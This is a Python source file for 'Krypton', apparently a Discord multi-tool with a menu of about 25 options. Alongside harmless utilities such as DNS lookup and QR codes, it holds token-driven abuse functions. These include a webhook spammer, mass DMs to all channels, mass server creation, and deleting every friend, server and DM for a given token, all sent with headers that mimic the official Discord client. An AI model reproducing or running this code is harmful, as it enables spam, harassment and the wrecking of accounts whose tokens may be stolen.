license = (

'''
License

Copyright (c) 2023 KillerDrift#4004

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

)

import requests , time , random , smtplib , qrcode , socket , shutil , dns.resolver , string , os , threading

from dns import resolver

from pytube import YouTube

import tkinter as tk
import tkinter.messagebox as msgbox

from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt as p
from rich.progress import track

console = Console()

root = tk.Tk()
root.withdraw()
msgbox.showwarning("Information", "Please maximize the window.")
root.destroy()

class Random:
    
    def restart():
        
        time.sleep(4)
        console.print('[red][bold][!][/red] [i u]Function closing...',justify='center')
        time.sleep(1)
        
        os.system('cls' if os.name == 'nt' else 'clear')

        console.print(Title, style=f"bold red", justify='center')
        print('\n')
        console.print(divider , style='bold red' , justify='center')
        print('\n')
        
        menu.menu()
        
        
    
    def randstr(lenn):
        alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
        text = ''
        for i in range(0, lenn):
            text += alpha[random.randint(0, len(alpha) - 1)]
        return text
    
    def mainHeader(token):
        return {
            "authorization": token,
            "accept": "*/*",
            'accept-encoding': 'gzip, deflate, br',
            "accept-language": "en-GB",
            "content-length": "90",
            "content-type": "application/json",
            "cookie": f"__cfuid={Random.randstr(43)}; __dcfduid={Random.randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
    
        
    def get_server_name(invite_link):
        invite_code = invite_link.split('/')[-1]
        response = requests.get(f'https://discord.com/api/v6/invites/{invite_code}')
        if response.status_code == 200:
            return response.json()['guild']['name']
        else:
            return None

class YTdownload:
    def download_video(url):
        yt = YouTube(url)
        video = yt.streams.first()
        video.download('Krypton\YT Videos')

class ip_port_pinger:

    def ping_port(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, int(port)))
            return True
        except socket.error as e:
            return False
        finally:
            s.close()

class QR:
    
    def qr():
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        data = str(p.ask("[>] Enter a link or text for the QR Code"))
        fill = str(p.ask("[>] Enter a fill color (Default Black)",default='black'))
        back = str(p.ask("[>] Enter a back color (Default White)",default='white'))
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color=fill, back_color=back)
        
        try:
            img.save(f"{data.strip()}.png")
            console.print(f'Saved as {data.strip()}.png', style='bold blue')
        except:
            name = random.randint(1,9999)
            img.save(f'IMG_{name}.png')
            console.print (f'Saved as IMG_{name}.png' , style= 'bold blue')

class IPpinger:

    def ping(host):
        
        timeout = 1
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.close()
            return True
        except:
            return False

class DNSLookup:
    def __init__(self, domain_name):
        self.domain_name = domain_name
        self.console = Console()

    def socket_lookup(self):
        try:
            ip = socket.gethostbyname(self.domain_name)
            return f'IP address of {self.domain_name} using socket: {ip}'
        except socket.gaierror:
            return f'Could not resolve {self.domain_name}'

    def socket_getaddrinfo_lookup(self):
        try:
            addrs = socket.getaddrinfo(self.domain_name, None)
            for addr in addrs:
                return f'IP address of {self.domain_name} using socket getaddrinfo: {addr[4][0]}'
        except socket.gaierror:
            return f'Could not resolve {self.domain_name}'

    def dns_lookup(self):
        try:
            # create a resolver object
            dns_resolver = resolver.Resolver()
            # use the resolver to perform the query
            answers = dns_resolver.resolve(self.domain_name, "A")
            ips = [answer.address for answer in answers]
            return f'IP address of {self.domain_name} using dnspython: {", ".join(ips)}'
        except resolver.NXDOMAIN:
            return f'Could not resolve {self.domain_name}'

    def dnspython_lookup(self):
        try:
            answer = resolver.resolve(self.domain_name, "A")
            for data in answer:
                return f'IP address of {self.domain_name} using dnspython: {data}'
        except dns.resolver.NXDOMAIN:
            return f'Could not resolve {self.domain_name}'

    def display_results(self):
        data = [
            ["socket", self.socket_lookup()],
            ["socket_getaddrinfo", self.socket_getaddrinfo_lookup()],
            ["dns", self.dns_lookup()],
            ["dnspython", self.dnspython_lookup()],
        ]

        table = Table(title="DNS Lookup Results")
        table.add_column("Method", justify="center", style="cyan")
        table.add_column("IP Address", justify="center", style="green")

        for method, ip_address in data:
            table.add_row(method, ip_address)

        self.console.print(table, justify='center') 

class WebhookSpammer:
    
    def spammer():
    
        msg = input("[>] Please Insert webhook Spam Message: ")
        amount = int(input('[>] Please Enter the amount of messages: ' ))
        webhook = input("[>] Please Insert webhook URL: ")
        
        def spam(msg, webhook):
            count = 1
            for step in track(range(amount)):
                try:   
                    data = requests.post(webhook, json={'content': msg})
                    if data.status_code == 204:
                        count += 1       
                        print(f"Sent {msg} | {count}")
                except:
                    print("Bad Webhook :" + webhook)
                    time.sleep(5)
                    exit()

        spam(msg, webhook)

class VanityCheck:
    


    def vanity(x):
        
        console = Console()
        
        
        r = requests.get(f'https://discord.com/api/v9/invites/{x}',proxies={'http' : 'http://' + 'proxy'})
        if r.status_code == 200:
            console.print(f'Vanity Taken | {x}', style="red")
        if r.status_code == 404:
            console.print(f'Vanity Available | {x}', style='i green')

class PassGen:

    def password_generator(length: int) -> str:
        letters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(letters) for i in range(length))
        return password

class txt2ascii:
    
    def text_to_ascii(text: str) -> str:
        ascii_art = ''
        for char in text:
            ascii_art += f'{char}\n'
        return ascii_art

class URL_Shorten:

    def shorten_url(url: str) -> str:
        headers = {
            'Content-Type': 'application/json'
        }
        data = {
            'longUrl': url
        }
        response = requests.post('https://api-ssl.bitly.com/v4/shorten', headers=headers, json=data)
        if response.status_code == 200:
            return response.json()['link']
        else:
            return None

class DeleteWebhook():
    def webdelete():

        web = input("[>] Webhook Link: ")
        try:
            requests.delete(web)
            console.print("[+] Webhook successfully deleted", style='green')
        except:
            console.print("[-] Error deleting webhook", style='red')
            
def WebhookInfo():

    webhook = input("[>] Enter your webhook link: ")
    
    table = Table(show_header=True, header_style="bold magenta")
    
    try:
        
        r = requests.get(webhook)
        
    except Exception as e:
        console.print('[-] Invalid Webhook',style='red')
        time.sleep(1)
        console.print(f'[-] Failed at: {e}',style='red')

    
    try:
        table.add_column("Attribute", style="bold")
        table.add_column("Value", style='bold magenta')

        table.add_row("Webhook Name", r.json()["name"])
        table.add_row("Webhook ID", r.json()["id"])
        table.add_row("Guild ID", r.json()["guild_id"])
        table.add_row("Channel ID", r.json()["channel_id"])
        if r.json()['avatar'] == 'null':
            table.add_row("Avatar", "None")
        else:
            avatar = f'[bold blue][link=https://cdn.discordapp.com/avatars/{r.json()["id"]}/{r.json()["avatar"]}]Link[/link]'
            table.add_row("Avatar", avatar)
        table.add_row("Token of Webhook", r.json()["token"])
        
    except Exception as e:
        console.print('[-] Invalid Webhook',style='red')
        time.sleep(1)
        console.print(f'[-] Failiure Info: {e}\n',style='red')
        table.add_row("[red]Failiure", 'Well, Thats unfortunate.')

    finally:
        console.print(table)

def serevr_joiner():

    link = str(p.ask('[>] Discord Invite Link'))
    token = p.ask('[>] Enter Token')
    
    if len(link) > 6:
        link = link[19:]
    apilink = "https://discordapp.com/api/v6/invite/" + str(link)


    print (link)

    for i in range(1):
            for i in range(1):
                headers={
                    'Authorization': token
                    }
                requests.post(apilink, headers=headers)
            
                console.print(f"\t[green][+] Joined this server: " + Random.get_server_name(link))

input

def server_creater():
    token = str(p.ask('[>] Enter Token'))
    amount = int(p.ask('[>] How many server you wanna create'))
    server_name = p.ask('[>] Servers names')
    count = 1
    headers = Random.mainHeader(token)
    for step in track(range(amount)):
        payload = {"name": server_name}
        requests.post(
        "https://discord.com/api/v9/guilds", headers=headers, json=payload
        )
        console.print(f"\t[green][+][/green] Server Created [{count}] ")
        count+=1
        
def remove_friends():
    
    token = str(p.ask('[>] Enter Token'))
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    frnds = requests.get(
        "https://discord.com/api/v9/users/@me/relationships", headers=headers
     ).json()
    
    for i in frnds:
        requests.delete(
            f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
                )
        
        console.print(f"[green][+][/green] Removed Friend {i['id']}")

def server_leaver():

    for i in range(1):
        try:
            token = p.ask('[>] Enter Token')
            console.print(f"\n[blue][+] Leave all available guilds")
            guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': token}).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                        headers={'Authorization': token})
                    console.print(f"\t[green][+][/green] Left this server: "+guild['name'])
                except Exception as e:
                    console.print(f"\t[red][-][/red] The following error occurred: {e}")

            console.print(f"\n[green][+][/green] Deleted all available guilds for this token: {token}")
        except Exception as e:
            console.print(f"\t[red][!][/red] Token : {token} | the following error occurred :{e}")

def mass_dm():
    message = p.ask('[>] Enter Message')
    token = p.ask('[>] Enter Token')
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    reqmas = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for chen in reqmas:
        
        json = {"content": message}
        time.sleep(1)
        requests.post(
            f"https://discord.com/api/v9/channels/{chen['id']}/messages",
            headers=headers,
            data=json,
            )
        console.print(f"[green][+][/green] {chen['id']} Sent")

def delete_servers():
    token = p.ask('[>] Enter Token')
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    console.print(f"[green][+][/green] Deleting...")
    dmms = requests.get(
    "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in dmms:
        requests.post(
            
            f"https://discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
            
            )
        
        console.print(f'[green][+][/green] {i["id"]} deleted')

def Close_dms():
    
    token = p.ask('[>] Enter Token')
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    try:
        clsdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        for channel in clsdms:
            requests.delete(
            f"https://discord.com/api/v9/channels/{channel['id']}",
            headers=headers,
                    )
            console.print(f'[green][+][/green] {channel["id"]} deleted')
    except Exception as e:
        print(e)

class Menu:
    
    def __init__(self):
        
        self.console = Console()

    def menu(self):
        
        options = [
            
            'DNS Lookup',
            'Webhook Spammer',
            'Vanity Checker',
            'QR Code Generator',
            'IP Pinger',
            'IP Port Pinger',
            'YT Video Download',
            'Password Gen',
            'Text to ASCII Art',
            'URL Shortener',
            'Reverse Text',
            'File Compresser',
            'Delete Webhook',
            'Webhook info',
            'Server Leaver',
            'Server Joiner',
            'Server Creater',
            'Friend Deleter',
            'Server Deleter',
            'Mass DM Friends',
            'Close DMs',
            'Invite to Server Name',
            '-------- End --------',
            'Lisence',
            'Exit'

        ]
        
        columns = 5

        rows = (len(options) + columns - 1) // columns
        cell_width = len(max(options, key=len)) + 4
        row_format = ''.join(['║{:<' + str(cell_width) + '}'] * columns) + " ║"
        divider = ''.join(['═' * (cell_width + 1)])
        header = '╔' + divider * columns + '╗'
        footer = '╚' + divider * columns + '╝'
        table = [header]
        for i in range(rows):
            cells = []
            for j in range(columns):
                index = i + j * rows
                if index < len(options):
                    cells.append(f'{index + 1:02}║ {options[index]}')
                else:
                    cells.append('  ' + ''.join([' ' * (cell_width - 2)]))
            table.append(row_format.format(*cells))
            if i < rows - 1:
                table.append(''.join(['╠' + divider * columns + '╣']))
        table.append(footer)
        
        console.print('\n'.join(table) , style='bold black i', justify='center') 
        
        width = shutil.get_terminal_size().columns

        divider = "══" * (width // 2)
        print('\n')
        console.print(divider , style='bold red' , justify='center')
        print('\n')
         
        centerer = "  " * (width // 4)
        
        console.print('[blink][bold red]Type out[/bold red] a [bold red]number[/bold red] then hit [bold red]enter', justify='center')
       
        try:
            op = int((input(centerer)))
            
        except Exception:
            
            console.print(f'Please enter a digit\n', style='red', justify='center')
            time.sleep(2)
                
            os.system('cls' if os.name == 'nt' else 'clear')

            console.print(Title, style=f"bold red", justify='center')
            print('\n')
            console.print(divider , style='bold red' , justify='center')
            print('\n')
            menu.menu()
            
        
        if op == 1:
            
            
            requested_domain = str(p.ask('[>] Enter a DNS (Example: Google.com)'))
            dns_lookup = DNSLookup(requested_domain)
            dns_lookup.display_results()
            
            Random.restart()
            
        elif op == 2:
            
            WebhookSpammer.spammer()
            
            Random.restart()
            
        elif op == 3:
            
            x = str(p.ask('[>] Enter Vanity Here'))
            VanityCheck.vanity(x)
            
            
            Random.get_server_name(x)
            Random.restart()
            
        elif op == 4:
            QR.qr()
            
            Random.restart()
            
        elif op == 5:
            
            host = p.ask("[blink i blue][>] Enter the host to ping: ")
    
            if IPpinger.ping(host):
                console.print(f"[+] {host}, is up!", style='green')
            else:
                console.print(f"[-] {host}, is down!", style='red')
                
            Random.restart()
                
        elif op == 6:
            host = p.ask('[>] Enter the host')
            port = p.ask('[>] Enter the port')
            
            if ip_port_pinger.ping_port(host, port):
                console.print(f"[+] {host}:{port} is open", style='green')
            else:
                console.print(f"[-] {host}:{port} is closed",style='red')
                
            Random.restart()
        
        elif op == 7:
            
            url = p.ask("Enter the YouTube video URL")
            YTdownload.download_video(url) 
            
            Random.restart()
            
        elif op == 8:
            
            length = int(p.ask('[>] Enter the ammount of chracters'))
            
            console.print(f'[%] Here is your Password: {PassGen.password_generator(length)}]')
            
            Random.restart()
            
        elif op == 9:
            
            text = str(p.ask('[>] Enter text'))
            console.print(txt2ascii.text_to_ascii(text), style='bold')
            
            Random.restart()
            
        elif op == 10:
            
            URL = str(p.ask('[>] Enter the link to shorten'))
            
            console.print(URL_Shorten.shorten_url(URL))
            
            Random.restart()
            
        elif op == 11:
            
            txt = str(p.ask('[>] Enter text to reverse'))
            
            console.print(txt[::-1])
            
            Random.restart()
            
        elif op == 12:
            
            
            file_path = str(p.ask('[>] Enter file path to compress'))
            shutil.make_archive(file_path, 'zip', file_path)
            console.print("File compressed!")
            
            Random.restart()
            
        elif op == 13:
            DeleteWebhook.webdelete() 
            
            Random.restart()
            
        elif op == 14:
            WebhookInfo()
            
            Random.restart()
            
        elif op == 15:
            server_leaver()
            
            Random.restart()
            
        elif op == 16:
            serevr_joiner()
            
            Random.restart()
            
        elif op == 17:
            server_creater()
            
            Random.restart()
        
        elif op == 18:
            remove_friends()
            
            Random.restart()
            
        elif op == 19:
            
            delete_servers()
            
            Random.restart()
            
        elif op == 20:
            
            mass_dm()
            
            Random.restart()
            
        elif op == 21:
            
            Close_dms()
            
            Random.restart()
            
        elif op == 22:
            
            link = p.ask('[>] Enter the invite link')
            console.print(Random.get_server_name(link))
            
            Random.restart()
            
        elif op == 23:
            
            Random.restart()
            
        elif op == 24:
            console.print(license,style='bold white')
            time.sleep(10)
            Random.restart()
        
        elif op == 25:
            
            countdown = 5
            os.system('cls' if os.name == 'nt' else 'clear')
            
            for i in range(countdown):
                console.print(f'[!] Thanks for using this tool. Closing in {countdown}...',style='bold yellow',justify='center')
                time.sleep(1)
                countdown -= 1
                os.system('cls' if os.name == 'nt' else 'clear')
            
            quit()
            
        else:
            console.print('This isnt a valid option\n', style='red', justify='center')
            time.sleep(2)
            
            os.system('cls' if os.name == 'nt' else 'clear')

            console.print(Title, style=f"bold red", justify='center')
            print('\n')
            console.print(divider , style='bold red' , justify='center')
            print('\n')
            menu.menu()
            
menu = Menu()

Title = ('''

                                                                                            
[#3F88C5]██╗  ██╗██████╗[/#3F88C5]  ██╗   ██╗██████╗ ████████╗ ██████╗ ███╗   ██╗
[#3F88C5]██║ ██╔╝██╔══██╗[/#3F88C5] ╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═████╗████╗  ██║
[#3F88C5]█████╔╝ ██████╔╝[/#3F88C5]  ╚████╔╝ ██████╔╝   ██║   ██║██╔██║██╔██╗ ██║
[#3F88C5]██╔═██╗ ██╔══██╗[/#3F88C5]   ╚██╔╝  ██╔═══╝    ██║   ████╔╝██║██║╚██╗██║
[#3F88C5]██║  ██╗██║  ██║[/#3F88C5]    ██║   ██║        ██║   ╚██████╔╝██║ ╚████║
[#3F88C5]╚═╝  ╚═╝╚═╝  ╚═╝[/#3F88C5]    ╚═╝   ╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
                                                                                                                       

[red]KillerDrift#4004[/red] | [blue]https://dsc.gg/krypt0n\n
[cyan]v1.01 Alpha[/cyan]''')
                                                                                      
console.print(Title, style=f"bold #EB5160", justify='center',)
time.sleep(1)

width = shutil.get_terminal_size().columns

divider = "══" * (width // 2)
print('\n')
console.print(divider , style='bold red' , justify='center')
print('\n')

menu.menu()